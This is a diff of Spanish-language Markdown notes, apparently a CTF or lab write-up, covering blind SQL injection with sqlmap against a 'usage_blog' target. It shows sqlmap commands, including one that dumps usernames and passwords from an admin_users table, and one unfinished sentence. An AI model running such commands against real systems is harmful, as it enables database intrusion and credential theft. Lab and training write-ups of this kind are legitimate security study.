@@ -60,14 +60,11 @@ sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin
 ### Blind SQLI
 
 ```python
-sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
+sqlmap -r request.txt --level 5 --risk 3 -p email --batch
 ```
-con este comando logramos ver que el párametro `email` es vulnerable a `SQLI-based blind` 
-
-
 ![[Pasted image 20240418105600.png]]
 
-
+`obtenemos el nombre de`
 ![[Pasted image 20240418125501.png]]
 
 ### sqlmap 
